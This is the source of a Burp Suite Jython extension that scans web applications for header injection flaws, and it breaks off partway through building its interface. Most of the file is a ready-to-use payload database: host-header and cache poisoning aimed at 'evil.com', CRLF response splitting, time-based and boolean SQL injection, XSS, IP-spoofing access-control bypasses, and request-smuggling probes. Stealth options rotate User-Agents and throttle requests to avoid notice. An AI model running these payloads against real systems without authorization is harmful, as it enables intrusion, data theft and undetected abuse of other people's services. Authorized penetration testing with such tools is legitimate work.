# -*- coding: utf-8 -*-
"""
================================================================================
 HeaderHunter Pro v1.0
 Advanced Header Injection Scanner for Burp Suite CE | Jython 2.7
================================================================================
 Author: Security Research
 Version: 1.0.0
 Description: Automated header injection testing based on real-world CVEs
              and bug bounty reports (2020-2026)

 Supported Attack Classes:
  - Host Header Poisoning (CVE-2026-29199, H1#281575)
  - CRLF Injection & Response Splitting
  - Blind SQLi via Headers (CVE-2026-46364)
  - XSS via Header Reflection
  - IP Spoofing & Access Control Bypass
  - Log Injection & Traceability Poisoning
  - Cache Poisoning Indicators
  - HTTP Desync / Smuggling Probes

 Stealth Features:
  - Configurable inter-request delay
  - Random User-Agent rotation
  - Response normalization & baseline comparison
  - Stealth mode (reduced payload count)
  - Smart anomaly detection (not just 200 OK)
================================================================================
"""

# ==================== IMPORTS ====================
from burp import (IBurpExtender, IContextMenuFactory, ITab, IHttpRequestResponse,
                  IExtensionHelpers, IHttpService, IRequestInfo, IResponseInfo)
from javax.swing import (JPanel, JTable, JScrollPane, JSplitPane, JTextArea,
                         JLabel, JButton, JCheckBox, JTextField, JComboBox,
                         JMenuItem, JPopupMenu, BoxLayout,
                         ListSelectionModel, JOptionPane, JProgressBar,
                         JTabbedPane, SwingUtilities, JSpinner, SpinnerNumberModel,
                         BorderFactory)
from javax.swing.table import DefaultTableModel, DefaultTableCellRenderer
from javax.swing.event import ListSelectionListener
from java.awt import Color, Font, Dimension, BorderLayout as AwtBorderLayout, GridLayout, FlowLayout
from java.awt.event import ActionListener
from java.lang import Runnable, Thread
from java.util import ArrayList, Date
import re
import time
import random
import urllib

# ==================== CONSTANTS ====================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
]

SQL_ERROR_PATTERNS = [
    r"SQL syntax.*?MySQL",
    r"Warning.*?mysqli",
    r"PostgreSQL.*?ERROR",
    r"ORA-[0-9]{5}",
    r"Microsoft SQL Server.*?ERROR",
    r"ODBC SQL Server Driver",
    r"SQLite/JDBCDriver",
    r"SQLiteException",
    r"System.Data.SQLite.SQLiteException",
    r"sqlite3.OperationalError",
    r"Syntax error.*?in query expression",
    r"Unclosed quotation mark",
    r"SQL command not properly ended",
    r"unexpected token",
    r"near \".*?\": syntax error",
    r"pg_query\(\).*?:",
    r"pg_exec\(\).*?:",
    r"supplied argument.*?not a valid PostgreSQL result",
    r"unterminated quoted string",
    r"invalid input syntax for",
    r"PG::SyntaxError:",
    r"PSQLException",
    r"Driver.*? SQL[\-_]*Server",
    r"OLE DB.*? SQL Server",
    r"SQLServer JDBC Driver",
    r"macromedia.jdbc.SQLServer",
    r"com.jnetdirect.jsql",
    r"SQLSrvException",
    r"SQLServerException",
    r"SqlException",
    r"SqlClient.SqlException",
    r"OracleException",
    r"Oracle error",
    r"Oracle.*?Driver",
    r"Warning.*?oci_.*?",
    r"Warning.*?ora_.*?",
    r"quoted string not properly terminated",
    r"ORA-00933",
    r"ORA-01756",
    r"ORA-00907",
    r"PLS-[0-9]{5}",
    r"SQLITE_ERROR",
    r"sqlite3.ProgrammingError",
    r"DB2 SQL error",
    r"SQLCODE",
    r"SQLSTATE",
    r"CLI Driver",
    r"DB2Exception",
    r"Informix ODBC Driver",
    r"Dynamic SQL Error",
    r"Sybase message",
    r"Sybase.*?Server message",
    r"Warning.*?sybase",
    r"Implicit conversion.*?not allowed",
    r"SybSQLException",
    r"com.sybase.jdbc",
]

XSS_CONTEXT_PATTERNS = [
    (r"<script[^>]*>.*?</script>", "Script context"),
    (r"<[^>]+on\w+\s*=", "Event handler context"),
    (r"javascript:", "JavaScript protocol"),
    (r"<iframe[^>]*>", "Iframe context"),
    (r"<object[^>]*>", "Object context"),
    (r"<embed[^>]*>", "Embed context"),
    (r"url\s*\(\s*['\"]?javascript:", "CSS JS context"),
]

# ==================== PAYLOAD DATABASE ====================

def get_payloads(stealth_mode=False, oob_domain="evil.com"):
    """Return all payloads. If stealth_mode=True, reduce by 60%."""
    payloads = []
    ev = oob_domain

    # === 1. HOST HEADER POISONING ===
    host_payloads = [
        {"cat": "Host Poisoning", "header": "Host", "value": ev, "desc": "Host override", "severity": "High", "detect": "redirect"},
        {"cat": "Host Poisoning", "header": "Host", "value": ev + ":80", "desc": "Host with port", "severity": "High", "detect": "redirect"},
        {"cat": "Host Poisoning", "header": "X-Forwarded-Host", "value": ev, "desc": "XFH override", "severity": "High", "detect": "redirect"},
        {"cat": "Host Poisoning", "header": "X-Forwarded-Proto", "value": "https", "desc": "Protocol override", "severity": "Medium", "detect": "redirect"},
        {"cat": "Host Poisoning", "header": "X-Forwarded-Port", "value": "443", "desc": "Port override", "severity": "Medium", "detect": "redirect"},
        {"cat": "Host Poisoning", "header": "X-Original-Host", "value": ev, "desc": "Original host", "severity": "High", "detect": "redirect"},
        {"cat": "Host Poisoning", "header": "X-Host", "value": ev, "desc": "X-Host override", "severity": "High", "detect": "redirect"},
        {"cat": "Host Poisoning", "header": "Forwarded", "value": "host=" + ev, "desc": "RFC 7239 Forwarded", "severity": "High", "detect": "redirect"},
        {"cat": "Host Poisoning", "header": "X-Forwarded-Server", "value": ev, "desc": "XFS override", "severity": "Medium", "detect": "redirect"},
        {"cat": "Host Poisoning", "header": "X-HTTP-Host-Override", "value": ev, "desc": "HTTP Host Override", "severity": "High", "detect": "redirect"},
        {"cat": "Host Poisoning", "header": "X-Rewrite-Url", "value": "http://" + ev + "/", "desc": "URL rewrite", "severity": "High", "detect": "redirect"},
        {"cat": "Host Poisoning", "header": "X-Original-Url", "value": "http://" + ev + "/", "desc": "Original URL", "severity": "High", "detect": "redirect"},
        {"cat": "Host Poisoning", "header": "X-Override-Url", "value": "http://" + ev + "/", "desc": "Override URL", "severity": "High", "detect": "redirect"},
        {"cat": "Host Poisoning", "header": "Front-End-Https", "value": "on", "desc": "Front-End HTTPS", "severity": "Low", "detect": "diff"},
    ]
    payloads.extend(host_payloads)

    # === 2. CRLF INJECTION ===
    crlf_payloads = [
        {"cat": "CRLF Injection", "header": "X-Test", "value": "test\r\nSet-Cookie: injected=true", "desc": "Standard CRLF", "severity": "High", "detect": "header"},
        {"cat": "CRLF Injection", "header": "X-Test", "value": "test\rSet-Cookie: injected=true", "desc": "CR only", "severity": "High", "detect": "header"},
        {"cat": "CRLF Injection", "header": "X-Test", "value": "test\nSet-Cookie: injected=true", "desc": "LF only", "severity": "High", "detect": "header"},
        {"cat": "CRLF Injection", "header": "X-Test", "value": "test%0d%0aSet-Cookie: injected=true", "desc": "URL-encoded CRLF", "severity": "High", "detect": "header"},
        {"cat": "CRLF Injection", "header": "X-Test", "value": "test%0dSet-Cookie: injected=true", "desc": "URL-encoded CR", "severity": "High", "detect": "header"},
        {"cat": "CRLF Injection", "header": "X-Test", "value": "test%0aSet-Cookie: injected=true", "desc": "URL-encoded LF", "severity": "High", "detect": "header"},
        {"cat": "CRLF Injection", "header": "X-Test", "value": "test%E5%98%8A%E5%98%8DSet-Cookie: injected=true", "desc": "Unicode overlong CRLF", "severity": "High", "detect": "header"},
        {"cat": "CRLF Injection", "header": "Referer", "value": "http://test.com\r\nX-Injected: true", "desc": "CRLF in Referer", "severity": "High", "detect": "header"},
        {"cat": "CRLF Injection", "header": "User-Agent", "value": "Mozilla\r\nX-Injected: true", "desc": "CRLF in UA", "severity": "High", "detect": "header"},
        {"cat": "CRLF Injection", "header": "X-Forwarded-For", "value": "127.0.0.1\r\nX-Injected: true", "desc": "CRLF in XFF", "severity": "High", "detect": "header"},
    ]
    payloads.extend(crlf_payloads)

    # === 3. SQL INJECTION IN HEADERS ===
    sqli_payloads = [
        {"cat": "SQL Injection", "header": "User-Agent", "value": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "desc": "MySQL time-based blind", "severity": "High", "detect": "time", "time_threshold": 4.0},
        {"cat": "SQL Injection", "header": "User-Agent", "value": "' AND pg_sleep(5)--", "desc": "PostgreSQL time-based", "severity": "High", "detect": "time", "time_threshold": 4.0},
        {"cat": "SQL Injection", "header": "User-Agent", "value": "'; WAITFOR DELAY '0:0:5'--", "desc": "MSSQL time-based", "severity": "High", "detect": "time", "time_threshold": 4.0},
        {"cat": "SQL Injection", "header": "User-Agent", "value": "' OR '1'='1", "desc": "Boolean-based", "severity": "Medium", "detect": "diff"},
        {"cat": "SQL Injection", "header": "User-Agent", "value": "' UNION SELECT NULL--", "desc": "Union-based", "severity": "Medium", "detect": "error"},
        {"cat": "SQL Injection", "header": "User-Agent", "value": "1' AND 1=1--", "desc": "Conditional true", "severity": "Medium", "detect": "diff"},
        {"cat": "SQL Injection", "header": "User-Agent", "value": "1' AND 1=2--", "desc": "Conditional false", "severity": "Medium", "detect": "diff"},
        {"cat": "SQL Injection", "header": "User-Agent", "value": "' AND 1=1 UNION SELECT null,version()--", "desc": "Union error probe", "severity": "Medium", "detect": "error"},
        {"cat": "SQL Injection", "header": "Referer", "value": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "desc": "MySQL time-based in Referer", "severity": "High", "detect": "time", "time_threshold": 4.0},
        {"cat": "SQL Injection", "header": "Referer", "value": "' OR '1'='1", "desc": "Boolean in Referer", "severity": "Medium", "detect": "diff"},
        {"cat": "SQL Injection", "header": "X-Forwarded-For", "value": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "desc": "MySQL time-based in XFF", "severity": "High", "detect": "time", "time_threshold": 4.0},
        {"cat": "SQL Injection", "header": "X-Forwarded-For", "value": "127.0.0.1' OR '1'='1", "desc": "Boolean in XFF", "severity": "Medium", "detect": "diff"},
        {"cat": "SQL Injection", "header": "Cookie", "value": "test=' AND SLEEP(5)--", "desc": "Time-based in Cookie", "severity": "High", "detect": "time", "time_threshold": 4.0},
        {"cat": "SQL Injection", "header": "Accept-Language", "value": "' AND SLEEP(5)--", "desc": "Time-based in Accept-Lang", "severity": "High", "detect": "time", "time_threshold": 4.0},
    ]
    payloads.extend(sqli_payloads)

    # === 4. XSS VIA HEADERS ===
    xss_payloads = [
        {"cat": "XSS via Headers", "header": "Referer", "value": "\"><script>alert(1)</script>", "desc": "Script tag in Referer", "severity": "High", "detect": "reflection"},
        {"cat": "XSS via Headers", "header": "Referer", "value": "\"><img src=x onerror=alert(1)>", "desc": "Img onerror in Referer", "severity": "High", "detect": "reflection"},
        {"cat": "XSS via Headers", "header": "User-Agent", "value": "\"><script>alert(1)</script>", "desc": "Script tag in UA", "severity": "High", "detect": "reflection"},
        {"cat": "XSS via Headers", "header": "User-Agent", "value": "\"><svg onload=alert(1)>", "desc": "SVG onload in UA", "severity": "High", "detect": "reflection"},
        {"cat": "XSS via Headers", "header": "User-Agent", "value": "javascript:alert(1)", "desc": "JS protocol in UA", "severity": "Medium", "detect": "reflection"},
        {"cat": "XSS via Headers", "header": "Referer", "value": "javascript:alert(1)", "desc": "JS protocol in Referer", "severity": "Medium", "detect": "reflection"},
        {"cat": "XSS via Headers", "header": "User-Agent", "value": "'-alert(1)-'", "desc": "Polyglot 1", "severity": "High", "detect": "reflection"},
        {"cat": "XSS via Headers", "header": "User-Agent", "value": "\"><marquee onstart=alert(1)>", "desc": "Marquee onstart", "severity": "High", "detect": "reflection"},
        {"cat": "XSS via Headers", "header": "User-Agent", "value": "\"><body onload=alert(1)>", "desc": "Body onload", "severity": "High", "detect": "reflection"},
        {"cat": "XSS via Headers", "header": "X-Forwarded-Host", "value": "\"><script>alert(1)</script>", "desc": "XSS in XFH", "severity": "High", "detect": "reflection"},
        {"cat": "XSS via Headers", "header": "Accept-Language", "value": "\"><script>alert(1)</script>", "desc": "XSS in Accept-Lang", "severity": "High", "detect": "reflection"},
    ]
    payloads.extend(xss_payloads)

    # === 5. IP SPOOFING / ACCESS CONTROL ===
    ip_payloads = [
        {"cat": "IP Spoofing", "header": "X-Forwarded-For", "value": "127.0.0.1", "desc": "XFF localhost", "severity": "Medium", "detect": "diff"},
        {"cat": "IP Spoofing", "header": "X-Forwarded-For", "value": "::1", "desc": "XFF IPv6 localhost", "severity": "Medium", "detect": "diff"},
        {"cat": "IP Spoofing", "header": "X-Real-IP", "value": "127.0.0.1", "desc": "X-Real-IP localhost", "severity": "Medium", "detect": "diff"},
        {"cat": "IP Spoofing", "header": "X-Originating-IP", "value": "127.0.0.1", "desc": "Originating IP", "severity": "Medium", "detect": "diff"},
        {"cat": "IP Spoofing", "header": "X-Remote-IP", "value": "127.0.0.1", "desc": "Remote IP", "severity": "Medium", "detect": "diff"},
        {"cat": "IP Spoofing", "header": "X-Remote-Addr", "value": "127.0.0.1", "desc": "Remote Addr", "severity": "Medium", "detect": "diff"},
        {"cat": "IP Spoofing", "header": "X-Client-IP", "value": "127.0.0.1", "desc": "Client IP", "severity": "Medium", "detect": "diff"},
        {"cat": "IP Spoofing", "header": "True-Client-IP", "value": "127.0.0.1", "desc": "True Client IP", "severity": "Medium", "detect": "diff"},
        {"cat": "IP Spoofing", "header": "CF-Connecting-IP", "value": "127.0.0.1", "desc": "Cloudflare IP", "severity": "Medium", "detect": "diff"},
        {"cat": "IP Spoofing", "header": "Forwarded", "value": "for=127.0.0.1", "desc": "RFC 7239 Forwarded", "severity": "Medium", "detect": "diff"},
        {"cat": "IP Spoofing", "header": "X-Cluster-Client-IP", "value": "127.0.0.1", "desc": "Cluster Client IP", "severity": "Medium", "detect": "diff"},
        {"cat": "IP Spoofing", "header": "X-Custom-IP-Authorization", "value": "127.0.0.1", "desc": "Custom IP Auth", "severity": "Medium", "detect": "diff"},
        {"cat": "IP Spoofing", "header": "X-Forwarded-For", "value": "10.0.0.1", "desc": "XFF internal IP", "severity": "Low", "detect": "diff"},
        {"cat": "IP Spoofing", "header": "X-Forwarded-For", "value": "192.168.1.1", "desc": "XFF private IP", "severity": "Low", "detect": "diff"},
        {"cat": "IP Spoofing", "header": "X-Forwarded-For", "value": "10.0.0.0/8", "desc": "XFF internal range", "severity": "Low", "detect": "diff"},
    ]
    payloads.extend(ip_payloads)

    # === 6. LOG INJECTION / TRACEABILITY ===
    log_payloads = [
        {"cat": "Log Injection", "header": "X-Request-Id", "value": "test%0d%0aInjected: true", "desc": "CRLF in Request ID", "severity": "Medium", "detect": "header"},
        {"cat": "Log Injection", "header": "X-Correlation-Id", "value": "test%0d%0aInjected: true", "desc": "CRLF in Correlation ID", "severity": "Medium", "detect": "header"},
        {"cat": "Log Injection", "header": "X-Trace-Id", "value": "test%0d%0aInjected: true", "desc": "CRLF in Trace ID", "severity": "Medium", "detect": "header"},
        {"cat": "Log Injection", "header": "X-Tt-Logid", "value": "test%0d%0aInjected: true", "desc": "CRLF in TT Log ID", "severity": "Medium", "detect": "header"},
        {"cat": "Log Injection", "header": "X-Bytefaas-Request-Id", "value": "test%0d%0aInjected: true", "desc": "CRLF in Bytefaas ID", "severity": "Medium", "detect": "header"},
        {"cat": "Log Injection", "header": "X-Request-Id", "value": "A" * 10000, "desc": "Oversized Request ID", "severity": "Low", "detect": "diff"},
        {"cat": "Log Injection", "header": "X-Amzn-Trace-Id", "value": "test%0d%0aInjected: true", "desc": "CRLF in AWS Trace", "severity": "Medium", "detect": "header"},
        {"cat": "Log Injection", "header": "X-B3-TraceId", "value": "test%0d%0aInjected: true", "desc": "CRLF in Zipkin Trace", "severity": "Medium", "detect": "header"},
        {"cat": "Log Injection", "header": "X-Datadog-Trace-Id", "value": "test%0d%0aInjected: true", "desc": "CRLF in Datadog Trace", "severity": "Medium", "detect": "header"},
    ]
    payloads.extend(log_payloads)

    # === 7. CACHE POISONING INDICATORS ===
    cache_payloads = [
        {"cat": "Cache Poisoning", "header": "X-Forwarded-Host", "value": ev, "desc": "XFH cache poison", "severity": "High", "detect": "cache"},
        {"cat": "Cache Poisoning", "header": "X-Original-Url", "value": "http://" + ev + "/", "desc": "X-Original-URL poison", "severity": "High", "detect": "cache"},
        {"cat": "Cache Poisoning", "header": "X-Rewrite-Url", "value": "http://" + ev + "/", "desc": "X-Rewrite-URL poison", "severity": "High", "detect": "cache"},
        {"cat": "Cache Poisoning", "header": "X-HTTP-Method-Override", "value": "POST", "desc": "Method override", "severity": "Medium", "detect": "diff"},
        {"cat": "Cache Poisoning", "header": "X-HTTP-Method", "value": "POST", "desc": "HTTP method override", "severity": "Medium", "detect": "diff"},
        {"cat": "Cache Poisoning", "header": "X-Original-Method", "value": "POST", "desc": "Original method", "severity": "Medium", "detect": "diff"},
    ]
    payloads.extend(cache_payloads)

    # === 8. HTTP DESYNC / SMUGGLING INDICATORS ===
    desync_payloads = [
        {"cat": "HTTP Desync", "header": "Content-Length", "value": "0\r\n\r\nGET /admin HTTP/1.1", "desc": "CL smuggling attempt", "severity": "High", "detect": "diff"},
        {"cat": "HTTP Desync", "header": "Transfer-Encoding", "value": " chunked", "desc": "TE whitespace prefix", "severity": "High", "detect": "diff"},
        {"cat": "HTTP Desync", "header": "Transfer-Encoding", "value": "chunked\r\n\r\n0\r\n\r\nX", "desc": "TE desync", "severity": "High", "detect": "diff"},
        {"cat": "HTTP Desync", "header": "X-Forwarded-For", "value": "127.0.0.1\r\nContent-Length: 0", "desc": "Header desync", "severity": "High", "detect": "diff"},
        {"cat": "HTTP Desync", "header": "Content-Length", "value": "1\r\n\r\nX", "desc": "CL desync short", "severity": "High", "detect": "diff"},
    ]
    payloads.extend(desync_payloads)

    # === 9. OOB / INTERACTION PAYLOADS ===
    oob_payloads = [
        {"cat": "OOB Interaction", "header": "User-Agent", "value": "Mozilla/5.0 (http://" + ev + ")", "desc": "OOB in UA", "severity": "Medium", "detect": "reflection"},
        {"cat": "OOB Interaction", "header": "X-Forwarded-Host", "value": ev, "desc": "OOB via XFH", "severity": "Medium", "detect": "redirect"},
        {"cat": "OOB Interaction", "header": "Referer", "value": "http://" + ev + "/", "desc": "OOB via Referer", "severity": "Medium", "detect": "reflection"},
    ]
    payloads.extend(oob_payloads)

    if stealth_mode:
        filtered = []
        seen_cats = {}
        for p in payloads:
            cat = p["cat"]
            if cat not in seen_cats:
                seen_cats[cat] = 0
            if seen_cats[cat] < 3:
                filtered.append(p)
                seen_cats[cat] += 1
        payloads = filtered

    return payloads

# ==================== UTILITY FUNCTIONS ====================

def get_random_ua():
    return random.choice(USER_AGENTS)

def url_encode(s):
    return urllib.quote(s, safe="")

def url_decode(s):
    return urllib.unquote(s)

def detect_sql_error(body_str):
    for pattern in SQL_ERROR_PATTERNS:
        if re.search(pattern, body_str, re.IGNORECASE):
            return True
    return False

def detect_xss_context(body_str, payload):
    for pattern, context in XSS_CONTEXT_PATTERNS:
        if re.search(pattern, body_str, re.IGNORECASE):
            return context
    if payload in body_str:
        return "Raw reflection"
    return None

def detect_new_headers(original_headers, new_headers):
    orig_set = set()
    for h in original_headers:
        parts = h.split(":", 1)
        if parts:
            orig_set.add(parts[0].strip().lower())
    new_set = set()
    for h in new_headers:
        parts = h.split(":", 1)
        if parts:
            new_set.add(parts[0].strip().lower())
    diff = new_set - orig_set
    return list(diff)

def get_header_value(headers, name):
    name_lower = name.lower()
    for h in headers:
        if h.lower().startswith(name_lower + ":"):
            parts = h.split(":", 1)
            if len(parts) > 1:
                return parts[1].strip()
    return None

def normalize_body(body_str):
    """Normalize body for comparison by removing dynamic tokens."""
    if not body_str:
        return ""
    normalized = re.sub(r"[a-f0-9]{32}", "[HASH]", body_str)
    normalized = re.sub(r"[a-f0-9]{40}", "[HASH]", normalized)
    normalized = re.sub(r"[a-f0-9]{64}", "[HASH]", normalized)
    normalized = re.sub(r"\d{13}", "[TIMESTAMP]", normalized)
    normalized = re.sub(r"\d{10}", "[TIMESTAMP]", normalized)
    # Python 2.7 re.sub does not accept flags kwarg; use compiled patterns
    token_re = re.compile(r"csrf[_-]?token[\"']?\s*[:=]\s*[\"']?[a-zA-Z0-9_-]+", re.IGNORECASE)
    normalized = token_re.sub("csrf_token=[TOKEN]", normalized)
    nonce_re = re.compile(r"nonce[\"']?\s*[:=]\s*[\"']?[a-zA-Z0-9_-]+", re.IGNORECASE)
    normalized = nonce_re.sub("nonce=[TOKEN]", normalized)
    tok_re = re.compile(r"token[\"']?\s*[:=]\s*[\"']?[a-zA-Z0-9_-]+", re.IGNORECASE)
    normalized = tok_re.sub("token=[TOKEN]", normalized)
    return normalized

# ==================== BURP EXTENDER ====================

class BurpExtender(IBurpExtender, IContextMenuFactory, ITab):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("HeaderHunter Pro v1.0")
        callbacks.registerContextMenuFactory(self)

        self._main_panel = self._build_ui()
        callbacks.addSuiteTab(self)

        self._scan_thread = None
        self._stop_flag = False
        self._result_data = []

        print("[HeaderHunter] Extension loaded successfully")
        print("[HeaderHunter] Right-click any request in HTTP History to scan")

    def getTabCaption(self):
        return "HeaderHunter"

    def getUiComponent(self):
        return self._main_panel

    def createMenuItems(self, invocation):
        menu = ArrayList()
        messages = invocation.getSelectedMessages()
        if messages and len(messages) > 0:
            item = JMenuItem("Send to HeaderHunter")
            item.addActionListener(MenuActionListener(self, invocation))
            menu.add(item)
        return menu

    def start_scan(self, message):
        try:
            if self._scan_thread and self._scan_thread.isAlive():
                JOptionPane.showMessageDialog(
                    self._main_panel,
                    "A scan is already running. Please wait or stop it first.",
                    "Scan in Progress",
                    JOptionPane.WARNING_MESSAGE
                )
                return

            self._stop_flag = False
            self._clear_results()
            self._progress_bar.setValue(0)
            self._status_label.setText("Status: Initializing...")

            service = message.getHttpService()
            request = message.getRequest()

            if not service:
                self._status_label.setText("Status: Error - No HTTP service")
                JOptionPane.showMessageDialog(
                    self._main_panel,
                    "The selected request has no HTTP service information.",
                    "Error",
                    JOptionPane.ERROR_MESSAGE
                )
                return

            if not request or len(request) == 0:
                self._status_label.setText("Status: Error - Empty request")
                JOptionPane.showMessageDialog(
                    self._main_panel,
                    "The selected request is empty.",
                    "Error",
                    JOptionPane.ERROR_MESSAGE
                )
                return

            print("[HeaderHunter] Starting scan for %s://%s:%d" % (
                service.getProtocol(), service.getHost(), service.getPort()
            ))

            self._scan_thread = ScanThread(self, request, service)
            self._scan_thread.start()
        except Exception, e:
            print("[HeaderHunter] start_scan error: %s" % str(e))
            self._status_label.setText("Status: Error - %s" % str(e))
            JOptionPane.showMessageDialog(
                self._main_panel,
                "Error starting scan: " + str(e),
                "Error",
                JOptionPane.ERROR_MESSAGE
            )

    def stop_scan(self):
        self._stop_flag = True
        self._status_label.setText("Status: Stopping...")

    def add_result(self, result):
        model = self._results_table.getModel()
        display_payload = result["payload"]
        if len(display_payload) > 50:
            display_payload = display_payload[:50] + "..."
        row = [
            model.getRowCount() + 1,
            result["category"],
            result["header"],
            display_payload,
            result["status"],
            result["length"],
            "%.2fs" % result["time"],
            result["issue"],
            result["severity"]
        ]
        model.addRow(row)
        self._result_data.append(result)
        self._results_table.setRowSelectionInterval(model.getRowCount() - 1, model.getRowCount() - 1)

    def update_progress(self, current, total):
        percent = int((current * 100) / total)
        self._progress_bar.setValue(percent)
        self._status_label.setText("Status: Testing %d/%d" % (current, total))

    def scan_complete(self):
        self._status_label.setText("Status: Complete (%d findings)" % len(self._result_data))
        self._progress_bar.setValue(100)
        if len(self._result_data) > 0:
            JOptionPane.showMessageDialog(
                self._main_panel,
                "Scan complete! %d potential issue(s) found." % len(self._result_data),
                "Done",
                JOptionPane.INFORMATION_MESSAGE
            )

    def _clear_results(self):
        model = self._results_table.getModel()
        while model.getRowCount() > 0:
            model.removeRow(0)
        self._result_data = []
        self._request_viewer.setText("")
        self._response_viewer.setText("")

    def _export_results(self):
        if len(self._result_data) == 0:
            JOptionPane.showMessageDialog(
                self._main_panel,
                "No results to export.",
                "Export",
                JOptionPane.WARNING_MESSAGE
            )
            return

        output = []
        output.append("=" * 80)
        output.append("HeaderHunter Pro - Scan Results")
        output.append("Generated: %s" % Date().toString())
        output.append("=" * 80)
        output.append("")

        for i, result in enumerate(self._result_data):
            output.append("[%d] %s | %s | %s" % (i + 1, result["category"], result["severity"], result["issue"]))
            output.append("    Header: %s" % result["header"])
            output.append("    Payload: %s" % result["payload"])
            output.append("    Response: HTTP %s | %d bytes | %.2fs" % (result["status"], result["length"], result["time"]))
            output.append("")

        self._request_viewer.setText("\n".join(output))
        self._response_viewer.setText("Export complete. %d results exported." % len(self._result_data))

    def _on_result_selected(self, event):
        row = self._results_table.getSelectedRow()
        if row < 0 or row >= len(self._result_data):
            return

        result = self._result_data[row]
        req_text = self._helpers.bytesToString(result.get("request", None) or "")
        resp_text = self._helpers.bytesToString(result.get("response", None) or "")

        detail = []
        detail.append("=" * 60)
        detail.append("ISSUE DETAILS")
        detail.append("=" * 60)
        detail.append("Category: %s" % result["category"])
        detail.append("Header: %s" % result["header"])
        detail.append("Payload: %s" % result["payload"])
        detail.append("Description: %s" % result.get("description", ""))
        detail.append("")
        detail.append("Status: %s" % result["status"])
        detail.append("Length: %d bytes" % result["length"])
        detail.append("Time: %.2fs" % result["time"])
        detail.append("Issue: %s" % result["issue"])
        detail.append("Severity: %s" % result["severity"])
        detail.append("")

        self._request_viewer.setText("\n".join(detail) + "\n\n" + "=" * 60 + "\nREQUEST:\n" + "=" * 60 + "\n" + req_text)
        self._response_viewer.setText(resp_text)

    def _build_ui(self):
        panel = JPanel(AwtBorderLayout())

        # Top control panel
        control_panel = JPanel(GridLayout(4, 1))
        control_panel.setBorder(BorderFactory.createTitledBorder("Configuration"))

        # Row 1: Title
        title_panel = JPanel(FlowLayout(FlowLayout.LEFT))
        title_label = JLabel("HeaderHunter Pro - Advanced Header Injection Scanner")
        title_label.setFont(Font("Dialog", Font.BOLD, 14))
        title_panel.add(title_label)
        control_panel.add(title_panel)

        # Row 2: Category checkboxes
        checkbox_panel = JPanel(FlowLayout(FlowLayout.LEFT))
        self._chk_host = JCheckBox("Host Poisoning", True)
        self._chk_crlf = JCheckBox("CRLF Injection", True)
        self._chk_sqli = JCheckBox("SQL Injection", True)
        self._chk_xss = JCheckBox("XSS via Headers", True)
        self._chk_ip = JCheckBox("IP Spoofing", True)
        self._chk_log = JCheckBox("Log Injection", True)
        self._chk_cache = JCheckBox("Cache Poisoning", True)
        self._chk_desync = JCheckBox("HTTP Desync", True)
        self._chk_oob = JCheckBox("OOB Interaction", True)
        checkbox_panel.add(self._chk_host)
        checkbox_panel.add(self._chk_crlf)
        checkbox_panel.add(self._chk_sqli)
        checkbox_panel.add(self._chk_xss)
        checkbox_panel.add(self._chk_ip)
        checkbox_panel.add(self._chk_log)
        checkbox_panel.add(self._chk_cache)
        checkbox_panel.add(self._chk_desync)
        checkbox_panel.add(self._chk_oob)
        control_panel.add(checkbox_panel)

        # Row 3: OOB domain + stealth + delay
        config_panel = JPanel(FlowLayout(FlowLayout.LEFT))
        config_panel.add(JLabel("OOB Domain:"))
        self._txt_oob = JTextField("evil.com", 20)
        config_panel.add(self._txt_oob)
        self._chk_stealth = JCheckBox("Stealth Mode (reduce payloads)", True)
        config_panel.add(self._chk_stealth)
        self._chk_random_ua = JCheckBox("Rotate User-Agent", True)
        config_panel.add(self._chk_random_ua)
        config_panel.add(JLabel("Delay (ms):"))
        self._delay_spinner = JSpinner(SpinnerNumberModel(1000, 0, 5000, 100))
        config_panel.add(self._delay_spinner)
        control_panel.add(config_panel)

        # Row 4: Buttons
        button_panel = JPanel(FlowLayout(FlowLayout.LEFT))
        self._btn_start = JButton("Start Scan (use context menu)")
        self._btn_stop = JButton("Stop")
        self._btn_clear = JButton("Clear Results")
        self._btn_export = JButton("Export to Text")
        button_panel.add(self._btn_start)
        button_panel.add(self._btn_stop)
        button_panel.add(self._btn_clear)
        button_panel.add(self._btn_export)
        control_panel.add(button_panel)

        panel.add(control_panel, AwtBorderLayout.NORTH)

        # Center: Results table
        self._results_table = JTable(ResultsTableModel())
        self._results_table.setAutoResizeMode(JTable.AUTO_RESIZE_ALL_COLUMNS)
        self._results_table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION)
        self._results_table.getSelectionModel().addListSelectionListener(ResultSelectionListener(self))
        self._results_table.setRowHeight(22)

        for i in range(9):
            self._results_table.getColumnModel().getColumn(i).setCellRenderer(SeverityRenderer())

        self._results_table.getColumnModel().getColumn(0).setPreferredWidth(30)
        self._results_table.getColumnModel().getColumn(1).setPreferredWidth(120)
        self._results_table.getColumnModel().getColumn(2).setPreferredWidth(120)
        self._results_table.getColumnModel().getColumn(3).setPreferredWidth(200)
        self._results_table.getColumnModel().getColumn(4).setPreferredWidth(50)
        self._results_table.getColumnModel().getColumn(5).setPreferredWidth(60)
        self._results_table.getColumnModel().getColumn(6).setPreferredWidth(50)
        self._results_table.getColumnModel().getColumn(7).setPreferredWidth(250)
        self._results_table.getColumnModel().getColumn(8).setPreferredWidth(70)

        table_scroll = JScrollPane(self._results_table)

